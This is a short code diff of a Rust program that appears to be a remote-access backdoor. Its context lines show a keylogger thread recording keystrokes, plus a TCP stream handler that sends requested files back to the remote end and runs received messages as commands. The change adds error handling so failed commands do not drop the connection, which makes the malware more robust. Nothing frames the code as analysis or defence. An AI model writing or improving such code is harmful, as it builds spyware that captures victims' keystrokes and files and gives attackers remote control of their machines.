@@ -23,7 +23,6 @@ fn main() -> std::io::Result<()> {
     let keystroke_log = Arc::new(Mutex::new(String::new()));
 
     // Clone the Arc for the keylogger thread
-    // let keylogger_stream = Arc::clone(&stream_mutex);
     let log_clone = Arc::clone(&keystroke_log);
 
     // Start keylogger in a separate thread
@@ -108,7 +107,12 @@ fn process_stream(mut stream: TcpStream) -> io::Result<()> {
                 .expect("No file name provided");
             send_file(&mut stream, filename)?;
         } else {
-            let response = execute_command(&message)?;
+            let response = match execute_command(&message) {
+                Ok(result) => result,
+                Err(e) => {                    
+                    format!("Error executing command: {}\n", e)
+                }
+            };
             stream.write_all(response.as_bytes())?;
         }
     }
